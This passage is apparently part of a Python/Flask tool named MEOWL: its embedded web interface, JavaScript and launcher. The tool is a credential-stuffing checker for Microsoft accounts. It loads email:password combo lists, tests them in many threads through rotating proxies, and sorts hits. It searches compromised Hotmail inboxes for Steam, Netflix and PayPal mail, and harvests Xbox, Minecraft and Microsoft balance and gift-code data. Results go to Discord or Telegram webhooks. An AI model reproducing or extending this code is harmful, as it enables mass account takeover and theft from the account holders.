        <input type="file" id="file-input" accept=".txt">
        <div class="file-btn">[ + ] load accounts .txt</div>
      </div>
      <textarea id="accounts" placeholder="email:password&#10;email:password&#10;..." style="margin-top:8px"></textarea>
      <div style="font-size:11px;color:var(--muted);margin-top:6px;text-align:right">
        <span id="account-count">0</span> loaded
      </div>
    </div>

    <div class="panel">
      <div class="label">02 · Checker Type</div>
      <div class="grid" id="checker-grid">
        <div class="card active" data-type="hotmail"><span class="em">📧</span>Hotmail</div>
        <div class="card" data-type="xbox"><span class="em">🎮</span>Xbox</div>
        <div class="card" data-type="rewards"><span class="em">⭐</span>Rewards</div>
        <div class="card" data-type="codefetcher"><span class="em">🎁</span>Codes</div>
        <div class="card" data-type="minecraft"><span class="em">⛏️</span>Minecraft</div>
        <div class="card" data-type="msbalance"><span class="em">💰</span>MS Balance</div>
      </div>
    </div>

    <div class="panel" id="keyword-panel">
      <div class="label">03 · Keywords (Hotmail only)</div>
      <div class="kw-wrap" id="kw-wrap">
        <div class="kw" data-kw="Roblox">Roblox</div>
        <div class="kw active" data-kw="Steam">Steam</div>
        <div class="kw active" data-kw="Netflix">Netflix</div>
        <div class="kw active" data-kw="PayPal">PayPal</div>
        <div class="kw" data-kw="noreply@instagram.com">Instagram</div>
        <div class="kw" data-kw="Discord">Discord</div>
        <div class="kw" data-kw="Minecraft">Minecraft</div>
        <div class="kw" data-kw="Spotify">Spotify</div>
      </div>
    </div>

    <div class="panel">
      <div class="label">04 · Proxy</div>
      <div class="toggle-row">
        <div class="toggle" id="proxy-toggle"></div>
        <div class="toggle-label">Mode: <b id="proxy-mode-label">Proxyless</b></div>
      </div>
      <div id="proxy-box" class="hidden">
        <textarea id="proxies" placeholder="host:port&#10;user:pass@host:port&#10;host:port:user:pass"></textarea>
      </div>
    </div>

    <div class="panel">
      <div class="label">05 · Threads</div>
      <div class="slider-row">
        <input type="range" id="threads-slider" min="1" max="50" value="30">
        <span class="slider-val" id="threads-val">30</span>
      </div>
    </div>

    <div class="btn-row">
      <button id="test-btn">Test</button>
      <button id="start-btn">▶ Start</button>
    </div>

    <div class="panel hidden" id="diag-panel">
      <div class="label">Test Diagnostic</div>
      <div class="diag-box" id="diag-box"></div>
    </div>
  </div>

  <div id="live" class="hidden">
    <div class="panel">
      <div class="status-row">
        <div class="dot running" id="status-dot"></div>
        <span id="status-text">Running…</span>
        <span style="margin-left:auto;color:var(--secondary)" id="session-id"></span>
      </div>
      <div class="bar-wrap">
        <div class="bar-fill" id="bar-fill"></div>
        <div class="bar-text" id="bar-text">0%</div>
      </div>
      <div class="stats" id="stats-grid"></div>
    </div>
    <div class="panel">
      <div class="label">Live Hits</div>
      <div class="hits" id="hits">
        <div class="empty">waiting for hits…</div>
      </div>
    </div>
    <div class="btn-row">
      <button id="menu-btn">☰ Menu</button>
      <button id="stop-btn">⏹ Stop</button>
      <button id="download-btn">⬇ Download</button>
    </div>
  </div>
</div>

<!-- ================= LOGS TAB ================= -->
<div id="tab-logs" class="hidden">
  <div class="panel">
    <div class="label">Checking Logs · <span id="logs-session-label">no session</span></div>
    <div class="btn-row" style="margin-bottom:12px">
      <button id="logs-refresh-btn">↻ Refresh</button>
      <button id="logs-clear-btn">🗑 Clear view</button>
    </div>
    <div class="small-stats" id="logs-stats-grid">
      <div class="small-stat"><div class="k">CHECKED</div><div class="v" id="lstat-checked">0</div></div>
      <div class="small-stat"><div class="k">HITS</div><div class="v" id="lstat-hits">0</div></div>
      <div class="small-stat"><div class="k">BAD</div><div class="v" id="lstat-bad">0</div></div>
      <div class="small-stat"><div class="k">2FA</div><div class="v" id="lstat-2fa">0</div></div>
      <div class="small-stat"><div class="k">CPM</div><div class="v" id="lstat-cpm">0</div></div>
      <div class="small-stat"><div class="k">ELAPSED</div><div class="v" id="lstat-elapsed">0s</div></div>
    </div>
    <div class="logs-box" id="logs-box">
      <div class="empty">no logs yet · start a checker to see live activity</div>
    </div>
  </div>
</div>

<!-- ================= VALIDATOR TAB ================= -->
<div id="tab-validator" class="hidden">
  <div class="panel">
    <div class="label">Proxy Validator (Live)</div>
    <div class="file-wrap" style="margin-bottom:8px">
      <input type="file" id="val-proxy-file" accept=".txt">
      <div class="file-btn">[ + ] upload proxy .txt</div>
    </div>
    <textarea id="val-proxies" placeholder="Paste proxies here...&#10;http://host:port&#10;socks5://host:port"></textarea>
    <div class="validator-actions">
      <button id="val-start-btn" style="border-color:var(--primary);color:var(--primary);">▶ Validate</button>
      <button id="val-copy-btn" style="border-color:var(--secondary);color:var(--secondary);">Copy Valid</button>
      <button id="val-download-btn" style="border-color:var(--secondary);color:var(--secondary);">⬇ .txt</button>
    </div>
    <div class="proxy-live-grid" id="val-live-grid">
      <div class="small-stat"><div class="k">TOTAL</div><div class="v" id="val-total">0</div></div>
      <div class="small-stat"><div class="k">CHECKED</div><div class="v" id="val-checked">0</div></div>
      <div class="small-stat"><div class="k">VALID</div><div class="v" id="val-valid" style="color:#22c55e">0</div></div>
      <div class="small-stat"><div class="k">DEAD</div><div class="v" id="val-dead" style="color:#ef4444">0</div></div>
    </div>
    <div class="bar-wrap" style="margin-top:10px">
      <div class="bar-fill" id="val-bar-fill"></div>
      <div class="bar-text" id="val-bar-text">0%</div>
    </div>
    <div style="margin-top:10px; font-size:12px; color:var(--muted);" id="val-stats">
      Waiting to validate...
    </div>
  </div>

  <div class="panel" id="val-results-panel" style="display:none;">
    <div class="label">Results</div>
    <div style="max-height:400px; overflow-y:auto;">
      <table class="proxy-table">
        <thead>
          <tr><th>Proxy</th><th>Status</th><th>Time</th><th>IP</th></tr>
        </thead>
        <tbody id="val-results-body"></tbody>
      </table>
    </div>
  </div>
</div>

<!-- ================= SETTINGS TAB ================= -->
<div id="tab-settings" class="hidden">
  <div class="panel">
    <div class="label">UI Theme</div>
    <div class="color-grid">
      <div>
        <label style="font-size:10px;color:var(--muted);">Primary Color</label>
        <input type="color" id="set-primary" value="#00b4d8">
      </div>
      <div>
        <label style="font-size:10px;color:var(--muted);">Secondary Color</label>
        <input type="color" id="set-secondary" value="#0077b6">
      </div>
    </div>
  </div>
  <div class="panel">
    <div class="label">Notifications</div>
    <div class="settings-row">
      <label>Discord Webhook URL</label>
      <input type="text" id="set-discord" placeholder="https://discord.com/api/webhooks/...">
    </div>
    <div class="settings-row">
      <label>Telegram Bot Token</label>
      <input type="text" id="set-tg-token" placeholder="123456:ABC-DEF...">
    </div>
    <div class="settings-row">
      <label>Telegram Chat ID</label>
      <input type="text" id="set-tg-chat" placeholder="-100123456789">
    </div>
  </div>
  <div class="btn-row">
    <button id="settings-save-btn" style="border-color:var(--primary);color:var(--primary);">💾 Save Settings</button>
  </div>
</div>

<div class="footer">MEOWL · <b>LOCAL</b> · 127.0.0.1</div>

<script>
const state = {
  sessionId: null,
  polling: null,
  logsPolling: null,
  checkerType: 'hotmail',
  keywords: new Set(['Steam','Netflix','PayPal']),
  proxyOn: false,
  settings: {},
  validProxies: [],
  valJobId: null,
  valPolling: null
};

function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelector(`.tab[onclick="switchTab('${name}')"]`).classList.add('active');
  ['checker','logs','validator','settings'].forEach(n => {
    document.getElementById('tab-' + n).classList.add('hidden');
  });
  document.getElementById('tab-' + name).classList.remove('hidden');
  if (name === 'settings') loadSettings();
  if (name === 'logs') startLogsPolling();
}

// SETTINGS
async function loadSettings() {
  const r = await fetch('/api/settings');
  const s = await r.json();
  state.settings = s;
  document.getElementById('set-primary').value = s.color_primary || '#00b4d8';
  document.getElementById('set-secondary').value = s.color_secondary || '#0077b6';
  document.getElementById('set-discord').value = s.discord_webhook || '';
  document.getElementById('set-tg-token').value = s.tg_token || '';
  document.getElementById('set-tg-chat').value = s.tg_chat_id || '';
  applyTheme();
}
function applyTheme() {
  document.documentElement.style.setProperty('--primary', state.settings.color_primary || '#00b4d8');
  document.documentElement.style.setProperty('--secondary', state.settings.color_secondary || '#0077b6');
}
document.getElementById('settings-save-btn').addEventListener('click', async () => {
  const body = {
    color_primary: document.getElementById('set-primary').value,
    color_secondary: document.getElementById('set-secondary').value,
    discord_webhook: document.getElementById('set-discord').value,
    tg_token: document.getElementById('set-tg-token').value,
    tg_chat_id: document.getElementById('set-tg-chat').value,
  };
  await fetch('/api/settings', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
  state.settings = body; applyTheme(); alert('Settings saved!');
});

// FILE LOAD
document.getElementById('file-input').addEventListener('change', async e => {
  const f = e.target.files[0]; if (!f) return;
  const text = await f.text();
  document.getElementById('accounts').value = text.trim();
  updateCount();
});
document.getElementById('val-proxy-file').addEventListener('change', async e => {
  const f = e.target.files[0]; if (!f) return;
  const text = await f.text();
  const ta = document.getElementById('val-proxies');
  ta.value = (ta.value.trim() ? ta.value + '\n' : '') + text.trim();
});

const accTa = document.getElementById('accounts');
accTa.addEventListener('input', updateCount);
function updateCount(){
  const n = accTa.value.split('\n').filter(l => l.trim()).length;
  document.getElementById('account-count').textContent = n;
}

document.getElementById('checker-grid').addEventListener('click', e => {
  const card = e.target.closest('.card'); if (!card) return;
  document.querySelectorAll('#checker-grid .card').forEach(c => c.classList.remove('active'));
  card.classList.add('active');
  state.checkerType = card.dataset.type;
  document.getElementById('keyword-panel').classList.toggle('hidden',
    state.checkerType !== 'hotmail');
});

document.getElementById('kw-wrap').addEventListener('click', e => {
  const kw = e.target.closest('.kw'); if (!kw) return;
  const v = kw.dataset.kw;
  if (state.keywords.has(v)) { state.keywords.delete(v); kw.classList.remove('active'); }
  else { state.keywords.add(v); kw.classList.add('active'); }
});

const toggle = document.getElementById('proxy-toggle');
const proxyBox = document.getElementById('proxy-box');
const proxyLabel = document.getElementById('proxy-mode-label');
toggle.addEventListener('click', () => {
  state.proxyOn = !state.proxyOn;
  toggle.classList.toggle('on', state.proxyOn);
  proxyBox.classList.toggle('hidden', !state.proxyOn);
  proxyLabel.textContent = state.proxyOn ? 'Proxy' : 'Proxyless';
});

const threadsSlider = document.getElementById('threads-slider');
const threadsVal = document.getElementById('threads-val');
threadsSlider.addEventListener('input', () => threadsVal.textContent = threadsSlider.value);

function getProxies(){
  if (!state.proxyOn) return [];
  return document.getElementById('proxies').value.split('\n').map(x => x.trim()).filter(Boolean);
}
function getKeywords(){
  const custom = document.getElementById('custom-kw') ? document.getElementById('custom-kw').value.split(',').map(x => x.trim()).filter(Boolean) : [];
  return [...state.keywords, ...custom];
}

document.getElementById('test-btn').addEventListener('click', async () => {
  const first = accTa.value.split('\n').map(l => l.trim()).filter(Boolean)[0];
  if (!first) { alert('No accounts'); return; }
  const box = document.getElementById('diag-panel');
  box.classList.remove('hidden');
  const out = document.getElementById('diag-box');
  out.textContent = 'testing…';
  try {
    const r = await fetch('/api/test', {method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({combo: first, checker_type: state.checkerType, proxies: getProxies()})});
    const d = await r.json();
    let html = `<div><span class="k">status </span><span class="v">${esc(d.status || '?')}</span></div>`;
    html += `<div><span class="k">combo  </span><span class="v">${esc(d.email || '?')}</span></div>`;
    if (d.error) html += `<div><span class="err">${esc(d.error)}</span></div>`;
    if (d.name) html += `<div><span class="k">mc name </span><span class="v">${esc(d.name)}</span></div>`;
    if (d.type) html += `<div><span class="k">acct type </span><span class="v">${esc(d.type)}</span></div>`;
    if (d.value_tier) html += `<div><span class="k">tier </span><span class="v">${esc(d.value_tier)}</span></div>`;
    if (d.ms_balance) html += `<div><span class="k">balance </span><span class="v">${esc(d.ms_balance)}</span></div>`;
    if (d.balance) html += `<div><span class="k">balance </span><span class="v">${esc(d.balance)}</span></div>`;
    if (d.cards && d.cards.length) html += `<div><span class="k">cards </span><span class="v">${esc(d.cards.join(', '))}</span></div>`;
    if (d.hypixl) html += `<div><span class="k">hypixel </span><span class="v">${esc(d.hypixl)}</span></div>`;
    if (d.bwstars) html += `<div><span class="k">bw stars </span><span class="v">${esc(d.bwstars)}</span></div>`;
    if (d.donut_smp) html += `<div><span class="k">donut </span><span class="v">${esc(d.donut_smp)}</span></div>`;
    const diag = d.diag || {};
    for (const [k, v] of Object.entries(diag)) {
      const vs = typeof v === 'string' ? v : JSON.stringify(v);
      html += `<div><span class="k">${esc(k)} </span><span class="v">${esc(vs)}</span></div>`;
    }
    out.innerHTML = html;
  } catch (e) {
    out.innerHTML = `<div class="err">request failed: ${esc(e.message)}</div>`;
  }
});

function esc(s){
  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

document.getElementById('start-btn').addEventListener('click', async () => {
  const raw = accTa.value.split('\n').map(l => l.trim()).filter(Boolean);
  if (!raw.length) { alert('No accounts'); return; }
  const body = {
    accounts: raw, checker_type: state.checkerType,
    keywords: getKeywords(), proxies: getProxies(),
    threads: parseInt(threadsSlider.value, 10), filename: 'meowl_run',
  };
  document.getElementById('start-btn').disabled = true;
  try {
    const r = await fetch('/api/start', {method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(body)});
    const d = await r.json();
    if (!r.ok) { alert('Error: ' + (d.error || r.status)); document.getElementById('start-btn').disabled = false; return; }
    state.sessionId = d.session_id;
    showLive();
  } catch (e) {
    alert('Network error: ' + e.message);
    document.getElementById('start-btn').disabled = false;
  }
});

document.getElementById('stop-btn').addEventListener('click', async () => {
  if (!state.sessionId) return;
  document.getElementById('stop-btn').disabled = true;
  await fetch('/api/stop/' + state.sessionId, {method: 'POST'});
});
document.getElementById('menu-btn').addEventListener('click', showSetup);
document.getElementById('download-btn').addEventListener('click', () => {
  if (!state.sessionId) return;
  downloadZip(state.sessionId);
});

function downloadZip(sid) {
    const a = document.createElement('a');
    a.href = '/api/download/' + sid;
    a.download = 'results.zip';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function showSetup() {
  document.getElementById('live').classList.add('hidden');
  document.getElementById('setup').classList.remove('hidden');
  document.getElementById('start-btn').disabled = false;
}

function showLive() {
  document.getElementById('setup').classList.add('hidden');
  document.getElementById('live').classList.remove('hidden');
  document.getElementById('stop-btn').disabled = false;
  if (state.polling) clearInterval(state.polling);
  state.polling = setInterval(poll, 1200);
  poll();
}

async function poll() {
  if (!state.sessionId) return;
  try {
    const [sRes, hRes] = await Promise.all([
      fetch('/api/status/' + state.sessionId),
      fetch('/api/hits/' + state.sessionId)]);
    if (!sRes.ok) return;
    const stats = await sRes.json();
    const hits = await hRes.json();
    renderStats(stats);
    renderHits(hits);
    if (stats.completed || stats.stopped) {
      clearInterval(state.polling);
      state.polling = null;
      document.getElementById('stop-btn').disabled = true;
      document.getElementById('status-dot').className = 'dot ' + (stats.stopped ? 'stopped' : 'done');
      document.getElementById('status-text').textContent = stats.stopped ? 'Stopped' : 'Complete';
      if (!document.getElementById('live').classList.contains('hidden')) {
        setTimeout(showSetup, 1500);
      }
    }
  } catch (e) {}
}

function renderStats(s){
  const pct = s.percent || 0;
  document.getElementById('bar-fill').style.width = pct.toFixed(1) + '%';
  document.getElementById('bar-text').textContent =
    pct.toFixed(1) + '% · ' + s.checked + '/' + s.total + ' · ' + s.cpm + ' cpm';
  const t = s.checker_type;
  let html = '';
  const cell = (k, v, cls) => `<div class="stat ${cls||''}"><div class="k">${k}</div><div class="v">${v}</div></div>`;
  html += cell('Valid', s.valid, '');
  html += cell('Bad', s.bad, 'danger');
  html += cell('2FA', s.twofa, 'warn');
  html += cell('Errors', s.errors, 'danger');
  if (t === 'hotmail') {
    html += cell('Inbox', s.inbox, 'cyan');
    html += cell('Active', s.active, 'cyan');
  } else if (t === 'xbox') {
    html += cell('Premium', s.premium, '');
    html += cell('Free', s.free, 'cyan');
    html += cell('GamePass', s.gamepass, 'cyan');
    html += cell('GScore', s.gamerscore, '');
  } else if (t === 'codefetcher') {
    html += cell('Codes', s.codes_found, '');
    html += cell('Accts w/ Codes', s.accounts_with_codes, 'cyan');
  } else if (t === 'minecraft') {
    html += cell('MC w/ Name', s.mc_with_name, 'gold');
    html += cell('MC Balance', s.mc_balance, 'gold');
    html += cell('MC Cards', s.mc_cards, 'cyan');
    html += cell('MC Donut', s.mc_donut, 'cyan');
    html += cell('MC Hypixel', s.mc_hypixel, 'cyan');
  } else if (t === 'msbalance') {
    html += cell('Balance Hits', s.ms_balance_hits, 'gold');
    html += cell('MC Cards', s.mc_cards, 'cyan');
  } else {
    html += cell('Hits', s.rewards_hits, '');
    html += cell('Points', s.rewards_points, '');
    html += cell('Zero', s.rewards_zero, 'warn');
  }
  if (s.proxied) {
    html += cell('Proxy Live', s.proxy_alive, 'cyan');
    html += cell('Proxy Dead', s.proxy_dead, 'danger');
  }
  html += cell('Elapsed', Math.floor(s.elapsed) + 's', 'cyan');
  html += cell('Threads', s.threads || '-', '');
  document.getElementById('stats-grid').innerHTML = html;
}

function renderHits(hits){
  const el = document.getElementById('hits');
  if (!hits.length) { el.innerHTML = '<div class="empty">waiting for hits…</div>'; return; }
  el.innerHTML = hits.slice().reverse().map(h => `
    <div class="hit">
      <span class="t">${h.time}</span>
      <span class="c ${h.color}">${h.category}</span>
      <span class="m">${esc(h.text)}</span>
    </div>`).join('');
}

// ===== LOGS TAB =====
function startLogsPolling() {
  if (state.logsPolling) clearInterval(state.logsPolling);
  refreshLogs();
  state.logsPolling = setInterval(refreshLogs, 1500);
}
function stopLogsPolling() {
  if (state.logsPolling) clearInterval(state.logsPolling);
  state.logsPolling = null;
}
async function refreshLogs() {
  if (!state.sessionId) {
    document.getElementById('logs-session-label').textContent = 'no session';
    document.getElementById('logs-box').innerHTML =
      '<div class="empty">no logs yet · start a checker to see live activity</div>';
    return;
  }
  document.getElementById('logs-session-label').textContent = '#' + state.sessionId;
  try {
    const r = await fetch('/api/logs/' + state.sessionId);
    if (!r.ok) return;
    const d = await r.json();
    const stats = d.stats || {};
    document.getElementById('lstat-checked').textContent = stats.checked ?? 0;
    document.getElementById('lstat-hits').textContent = stats.valid ?? 0;
    document.getElementById('lstat-bad').textContent = stats.bad ?? 0;
    document.getElementById('lstat-2fa').textContent = stats.twofa ?? 0;
    document.getElementById('lstat-cpm').textContent = stats.cpm ?? 0;
    document.getElementById('lstat-elapsed').textContent = Math.floor(stats.elapsed || 0) + 's';
    const logs = d.logs || [];
    const box = document.getElementById('logs-box');
    if (!logs.length) {
      box.innerHTML = '<div class="empty">no logs yet</div>';
      return;
    }
    box.innerHTML = logs.slice().reverse().map(l => `
      <div class="log-line">
        <span class="lt">${esc(l.time)}</span>
        <span class="lk ${esc(l.kind)}">${esc(l.kind)}</span>
        <span class="lm">${esc(l.text)}</span>
      </div>`).join('');
  } catch (e) {}
}
document.getElementById('logs-refresh-btn').addEventListener('click', refreshLogs);
document.getElementById('logs-clear-btn').addEventListener('click', () => {
  document.getElementById('logs-box').innerHTML = '<div class="empty">view cleared</div>';
});

// ===== PROXY VALIDATOR LIVE =====
document.getElementById('val-start-btn').addEventListener('click', async () => {
  const raw = document.getElementById('val-proxies').value.split('\n').map(x=>x.trim()).filter(Boolean);
  if (!raw.length) return alert('No proxies to validate');
  document.getElementById('val-start-btn').disabled = true;
  document.getElementById('val-start-btn').textContent = 'Starting...';
  document.getElementById('val-results-panel').style.display = 'none';
  document.getElementById('val-results-body').innerHTML = '';
  document.getElementById('val-total').textContent = raw.length;
  document.getElementById('val-checked').textContent = 0;
  document.getElementById('val-valid').textContent = 0;
  document.getElementById('val-dead').textContent = 0;
  document.getElementById('val-bar-fill').style.width = '0%';
  document.getElementById('val-bar-text').textContent = '0%';
  try {
    const r = await fetch('/api/validate/start', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({proxies: raw})
    });
    const d = await r.json();
    if (!r.ok) throw new Error(d.error || 'failed');
    state.valJobId = d.job_id;
    if (state.valPolling) clearInterval(state.valPolling);
    state.valPolling = setInterval(pollValidation, 600);
    pollValidation();
  } catch(e) {
    alert('Validation failed: ' + e.message);
    document.getElementById('val-start-btn').disabled = false;
    document.getElementById('val-start-btn').textContent = '▶ Validate';
  }
});

async function pollValidation() {
  if (!state.valJobId) return;
  try {
    const r = await fetch('/api/validate/status/' + state.valJobId);
    if (!r.ok) return;
    const d = await r.json();
    document.getElementById('val-total').textContent = d.total;
    document.getElementById('val-checked').textContent = d.checked;
    document.getElementById('val-valid').textContent = d.valid;
    document.getElementById('val-dead').textContent = d.dead;
    const pct = d.total ? (d.checked / d.total * 100) : 0;
    document.getElementById('val-bar-fill').style.width = pct.toFixed(1) + '%';
    document.getElementById('val-bar-text').textContent = pct.toFixed(1) + '% · ' + d.checked + '/' + d.total;
    document.getElementById('val-stats').innerHTML =
      `Checked: <b>${d.checked}</b> / ${d.total} &nbsp;|&nbsp; Valid: <b style="color:var(--primary)">${d.valid}</b> &nbsp;|&nbsp; Dead: <b style="color:var(--danger)">${d.dead}</b>`;

    state.validProxies = (d.results || []).filter(x => x.status === 'Valid');
    const tbody = document.getElementById('val-results-body');
    tbody.innerHTML = (d.results || []).map(x => `
      <tr>
        <td style="word-break:break-all">${esc(x.proxy)}</td>
        <td class="${x.status === 'Valid' ? 'valid' : 'dead'}">${esc(x.status)}</td>
        <td>${x.time}s</td>
        <td>${x.ip || '-'}</td>
      </tr>`).join('');
    document.getElementById('val-results-panel').style.display = 'block';

    if (d.done) {
      clearInterval(state.valPolling);
      state.valPolling = null;
      document.getElementById('val-start-btn').disabled = false;
      document.getElementById('val-start-btn').textContent = '▶ Validate';
    }
  } catch (e) {}
}

document.getElementById('val-copy-btn').addEventListener('click', () => {
  if (!state.validProxies.length) return alert('No valid proxies to copy');
  const text = state.validProxies.map(p => p.proxy).join('\n');
  navigator.clipboard.writeText(text).then(() => alert('Copied valid proxies!'));
});
document.getElementById('val-download-btn').addEventListener('click', () => {
  if (!state.validProxies.length) return alert('No valid proxies to download');
  const text = state.validProxies.map(p => p.proxy).join('\n');
  const blob = new Blob([text], {type: 'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'valid_proxies.txt';
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
});

// Init
loadSettings();
</script>
</body>
</html>
"""

# ===== Main =====
def find_free_port(start=PORT_DEFAULT):
    for port in range(start, start + 30):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try: s.bind(('127.0.0.1', port)); return port
            except OSError: continue
    return start

def open_browser(url):
    time.sleep(1.5)
    try:
        import webbrowser
        webbrowser.open(url)
    except Exception:
        pass

if __name__ == '__main__':
    if os.environ.get("VERCEL"):
        pass
    else:
        port = find_free_port(PORT_DEFAULT)
        url = f"http://127.0.0.1:{port}"
        print(f"[*] Starting MEOWL on {url}")
        print(f"[*] New checker types: minecraft, msbalance")
        print(f"[*] New tab: Logs (live checking log)")
        threading.Thread(target=open_browser, args=(url,), daemon=True).start()
        try:
            app.run(host='0.0.0.0', port=port, threaded=True, debug=False, use_reloader=False)
        except Exception as e:
            print(f"[!] Server crashed: {e}")